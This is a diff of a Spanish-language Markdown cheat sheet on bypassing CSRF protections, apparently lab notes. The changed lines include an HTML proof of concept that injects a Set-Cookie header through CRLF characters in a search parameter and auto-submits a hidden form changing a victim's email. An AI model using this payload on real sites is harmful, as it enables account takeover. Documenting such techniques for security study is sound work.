@@ -47,7 +47,7 @@ Dependiendo del metodo de peticion, se puede hacer con GET
 ```
 ---
 ### 3- CSRF donde la validación del token depende de la presencia del token <a name="CSRFenPresencia"></a>
-No verifica el token CSRF, se eliminia y se bypassea
+No verifica el token CSRF, se eliminia y se bypassea.
 
 ```html
 <html>
@@ -85,7 +85,7 @@ Por lo que se podria usar el mismo csrf token y la misma csrf key en una cuenta 
       <input type="hidden" name="email" value="pwn&#64;ed&#46;com" /> 
       <input type="hidden" name="csrf" value="<csrf>" />
       <input type="submit" value="Submit request" />    </form>
-  <img src="https://vulnerable-web.com//?search=test%0d%0aSet-Cookie:%20csrfKey=<key>" onerror="document.forms[0].submit()">
+  <img src="https://vulnerable-web.com/?search=test%0d%0aSet-Cookie:%20csrfKey=<key>" onerror="document.forms[0].submit()">
 
   </body>
 </html>
